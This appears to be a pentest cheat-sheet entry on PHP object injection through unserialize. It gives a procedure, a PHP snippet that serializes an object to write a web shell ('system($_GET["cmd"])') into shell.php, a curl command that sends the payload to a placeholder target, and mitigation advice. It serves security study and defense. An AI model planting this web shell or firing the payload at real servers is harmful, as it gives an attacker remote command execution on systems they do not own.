---
topic: PHP object injection
tags: [web, php, unserialize, object-injection, rce]
---

# PHP object injection

[🌐 Español](php-object-injection.md) | **English**

## Concept

`unserialize` on user data allows building arbitrary objects. Classes with magic methods such as `__destruct`, `__wakeup` or `__toString` can write files, run commands or alter application logic.

## When it applies

- The application deserializes a cookie, parameter or file.
- A class with useful magic methods exists.
- Source or autoloading is accessible.

## Procedure

1. Identify the `unserialize` and its format.
2. Review classes and magic methods.
3. Build the object with `__construct` or manual serialization.
4. Send the payload and check the effect.

```php
class DatabaseExport {
    public $user_file = 'shell.php';
    public $data = '<?php system($_GET["cmd"]); ?>';
}
echo serialize(new DatabaseExport);
```

```bash
curl -G http://<IP>/sator.php --data-urlencode 'arepo=O:14:"DatabaseExport":2:{...}'
```

## Variants

- Use `__destruct` to delete or write files.
- Abuse `__wakeup` to skip validation.
- Chain multiple classes (POP chain).

## Limitations

- The class must be loaded.
- The payload must match string lengths.
- The entry point must accept the object.

## Mitigation and detection

- Do not deserialize external data; use JSON.
- Allowlist classes and sign data.
- Update dependencies and review magic methods.

## References

- <https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection>
- <https://www.php.net/manual/en/function.unserialize.php>
- <https://attack.mitre.org/techniques/T1059/006/>
